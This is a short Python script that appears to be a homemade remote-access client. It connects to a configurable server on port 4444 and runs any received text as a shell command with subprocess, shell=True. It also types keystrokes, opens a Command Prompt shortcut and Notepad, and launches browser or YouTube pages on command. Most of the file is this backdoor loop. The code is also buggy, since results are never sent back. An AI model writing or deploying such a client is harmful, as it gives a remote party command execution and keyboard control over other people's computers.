import sys
import os
import socket
import subprocess
import pywhatkit
import webbrowser
from keyboard import press
from keyboard import write

SERVER_IP="127.0.0.1" # change ip addres 
PORT=4444

def n():
    npath = "C:\\Windows\\System32\\notepad.exe"
    os.startfile(npath)


s = socket.socket()
s.connect((SERVER_IP, PORT))
msg = s.recv(1024).decode()
print('[*]servar:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] recevied command: {cmd}')
    serch = s.recv(1024).decode()
    cm=serch.lower()
    if cmd.lower() in ['q', 'exit', 'quit', 'x']:
        print('hai')
        break
    elif cmd.lower() in ['hi']:
        print('hy')
       
    elif cmd.lower() in ['notepad']:
         print('hiii')
         npath = "C:\\Windows\\System32\\notepad.exe"
         os.startfile("C:\\Users\\sanke\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\Command Prompt.lnk")
         os.startfile(npath)
         write('ls')
        
    elif cmd.lower() in ['you']:
        pywhatkit.playonyt(f'{cm}')
    elif cmd.lower() in ['youtube']:
        pywhatkit.playonyt(f'{cm}')
    elif cmd.lower() in ['brose','internet','chrome']:
         webbrowser.open(cm)
    elif cmd.lower() in ['text','write','type']:
        write(cm)
    elif cmd.lower() in ['hack']:
        n()
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    result = '[+] Executed Succesfully'.encode
    
     
s.close()